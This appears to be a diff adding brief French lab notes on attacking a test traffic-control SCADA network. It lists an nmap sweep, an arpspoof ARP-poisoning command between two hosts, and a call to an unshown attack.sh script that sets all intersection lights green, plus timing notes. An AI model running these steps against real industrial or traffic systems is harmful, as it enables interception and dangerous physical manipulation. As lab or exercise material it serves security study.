@@ -1,0 +1,13 @@
+nmap -sn 192.168.1.0/24
+=> Découverte sur le réseau de scada.test_network et PLC1.test_network
+
+arpspoof -r -t 192.168.1.11 192.168.1.5
+=> Usurpation 
+
+./attack.sh
+=> Passage de tous les feux de l'intersection au vert 
+
+
+# 185 ms de délai, trafic scaling à 10
+
+# Croisement à 150, 190, 550
